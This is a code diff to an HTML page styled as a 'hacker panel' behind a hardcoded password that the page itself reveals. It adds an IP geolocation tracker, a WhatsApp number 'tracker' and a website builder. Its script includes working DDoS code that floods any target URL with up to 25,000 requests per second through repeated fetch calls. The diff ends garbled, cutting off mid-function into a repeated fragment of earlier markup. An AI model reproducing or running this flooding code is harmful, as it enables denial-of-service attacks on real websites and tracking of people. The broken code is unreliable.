@@ -222,6 +222,28 @@
             margin-top: 15px;
             font-family: 'Courier New', monospace;
         }
+        
+        .deploy-status {
+            background: #000;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            min-height: 100px;
+        }
+        
+        .status-success {
+            color: #00ff00;
+        }
+        
+        .status-error {
+            color: #ff0000;
+        }
+        
+        .status-info {
+            color: #0088ff;
+        }
     </style>
 </head>
 <body>
@@ -323,6 +345,238 @@
                 <h2 style="color: #0088ff; margin-bottom: 20px;">🎯 IP TRACKER</h2>
                 
                 <input type="text" id="ipInput" placeholder="Enter IP address" 
+                       style="width: 100%; padding: 12px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; margin-bottom: 15px;">
+                
+                <button class="access-btn" style="background: #0088ff;" onclick="trackIP()">TRACK IP</button>
+                
+                <div class="tracker-result" id="ipResult">
+                    IP tracking results will appear here...
+                </div>
+            </div>
+        </div>
+        
+        <!-- Phone Tracker Tool -->
+        <div id="phoneTool" style="display: none;">
+            <div class="tracker-panel">
+                <h2 style="color: #25D366; margin-bottom: 20px;">📱 WHATSAPP TRACKER</h2>
+                
+                <input type="text" id="phoneInput" placeholder="Enter WhatsApp number (+628...)" 
+                       style="width: 100%; padding: 12px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; margin-bottom: 15px;">
+                
+                <button class="access-btn" style="background: #25D366;" onclick="trackPhone()">TRACK NUMBER</button>
+                
+                <div class="tracker-result" id="phoneResult">
+                    Phone tracking results will appear here...
+                </div>
+            </div>
+        </div>
+        
+        <!-- Website Builder Tool -->
+        <div id="websiteTool" style="display: none;">
+            <div class="tracker-panel">
+                <h2 style="color: #ff8800; margin-bottom: 20px;">🌐 WEBSITE BUILDER</h2>
+                
+                <textarea id="htmlCode" placeholder="Paste your HTML code here..." 
+                          style="width: 100%; height: 200px; padding: 12px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; margin-bottom: 15px; font-family: 'Courier New', monospace;"></textarea>
+                
+                <button class="access-btn" style="background: #ff8800;" onclick="previewWebsite()">PREVIEW</button>
+                <button class="access-btn" style="background: #00ff00; color: #000; margin-left: 10px;" onclick="deployWebsite()">DEPLOY WEBSITE</button>
+                
+                <div class="deploy-status" id="deployStatus">
+                    Deployment status will appear here...
+                </div>
+                
+                <div style="margin-top: 15px;">
+                    <iframe id="websitePreview" style="width: 100%; height: 300px; border: 1px solid #00ff00; border-radius: 5px; background: white;"></iframe>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Password
+        const ACCESS_KEY = "KEN";
+        let currentTool = null;
+        let attackActive = false;
+        let requestCount = 0;
+        let successCount = 0;
+        let startTime = 0;
+        let attackInterval;
+        
+        // Create Matrix Background
+        function createMatrix() {
+            const chars = "01010101010101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            const bg = document.getElementById('matrixBg');
+            
+            for (let i = 0; i < 50; i++) {
+                const char = document.createElement('div');
+                char.className = 'matrix-char';
+                char.textContent = chars[Math.floor(Math.random() * chars.length)];
+                char.style.left = Math.random() * 100 + 'vw';
+                char.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                char.style.animationDelay = Math.random() * 5 + 's';
+                bg.appendChild(char);
+            }
+        }
+        
+        // Check Access Key - FIXED
+        function checkAccessKey() {
+            const keyInput = document.getElementById('accessKey');
+            const message = document.getElementById('loginMessage');
+            const key = keyInput.value;
+            
+            console.log("Checking key:", key); // Debug
+            
+            if (key === ACCESS_KEY) {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('mainPanel').style.display = 'block';
+                message.style.display = 'none';
+            } else {
+                message.style.display = 'block';
+                message.textContent = '❌ Invalid access key. Try: KEN';
+                keyInput.value = '';
+                
+                // Shake effect
+                const loginBox = document.querySelector('.login-box');
+                loginBox.style.animation = 'shake 0.5s';
+                setTimeout(() => {
+                    loginBox.style.animation = '';
+                }, 500);
+            }
+        }
+        
+        // Show Tool
+        function showTool(tool) {
+            // Hide all tools
+            document.querySelectorAll('[id$="Tool"]').forEach(el => {
+                el.style.display = 'none';
+            });
+            
+            // Show selected tool
+            document.getElementById(tool + 'Tool').style.display = 'block';
+            currentTool = tool;
+        }
+        
+        // DDOS Functions
+        function startAttack(mode) {
+            if (attackActive) return;
+            
+            const target = document.getElementById('targetUrl').value;
+            if (!target) {
+                addLog('ERROR: Enter target URL');
+                return;
+            }
+            
+            attackActive = true;
+            requestCount = 0;
+            successCount = 0;
+            startTime = Date.now();
+            
+            const config = {
+                low: { rps: 100, duration: 60 },
+                medium: { rps: 1000, duration: 120 },
+                high: { rps: 5000, duration: 180 },
+                god: { rps: 25000, duration: 300 }
+            }[mode];
+            
+            addLog(`🚀 Starting ${mode.toUpperCase()} attack: ${config.rps} RPS`);
+            
+            let timeLeft = config.duration;
+            
+            attackInterval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(attackInterval);
+                    return;
+                }
+                
+                // Send requests
+                for (let i = 0; i < config.rps / 10; i++) {
+                    sendRequest(target);
+                }
+                
+                timeLeft--;
+                updateStats(timeLeft);
+                
+                if (timeLeft <= 0) {
+                    stopAttack();
+                    addLog('⏰ Attack completed');
+                }
+                
+            }, 100);
+        }
+        
+        function sendRequest(target) {
+            requestCount++;
+            
+            fetch(target, {
+                method: 'GET',
+                mode: 'no-cors',
+                cache: 'no-store'
+            })
+            .then(() => {
+                successCount++;
+            })
+            .catch(() => {});
+            
+            // Log every 1000 requests
+            if (requestCount % 1000 === 0) {
+                addLog(`Sent ${requestCount.toLocaleString()} requests`);
+            }
+        }
+        
+        function stopAttack() {
+            attackActive = false;
+            clearInterval(attackInterval);
+            addLog('🛑 Attack stopped');
+        }
+        
+        function updateStats(timeLeft) {
+            const duration = (Date.now() - startTime) / 1000;
+            const rps = duration > 0 ? Math.round(requestCount / duration) : 0;
+            const successRate = requestCount > 0 ? Math.round((successCount / requestCount) * 100) : 0;
+            
+            document.getElementById('requests').textContent = requestCount.toLocaleString();
+            document.getElementById('rps').textContent = rps.toLocaleString();
+            document.getElementById('success').textContent = successRate + '%';
+            document.getElementById('timeLeft').textContent = timeLeft + 's';
+        }
+        
+        function addLog(message) {
+            const log = document.getElementById('ddosLog');
+            const entry = document.createElement('div');
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        // IP Tracker
+        async function trackIP() {
+            const ip = document.getElementById('ipInput').value;
+            if (!ip) {
+                document.getElementById('ipResult').textContent = 'Please enter an IP address';
+                return;
+            }
+            
+            document.getElementById('ipResult').textContent = 'Tracking IP...';
+            
+            try {
+                const response = await fetch(`http://ip-api.com/json/${ip}`);
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    document.getElementById('ipResult').innerHTML = `
+                        IP: ${data.query}<br>
+                        Country: ${data.country}<br>
+                        City: ${data.city}<br>
+                        ISP: ${data.isp}<br>
+                        Lat/Lon: ${data.lat}, ${data.lon}<br>
+                        Timezone: ${data.timezone}
+                    `;
+                } else {
+                    document.getElementById('ipResult').textContent = 'IP not found';
+                }
+            } catch (error) {
+                dt" id="ipInput" placeholder="Enter IP address" 
                        style="width: 100%; padding: 12px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; margin-bottom: 15px;">
                 
                 <button class="access-btn" style="background: #0088ff;" onclick="trackIP()">TRACK IP</button>
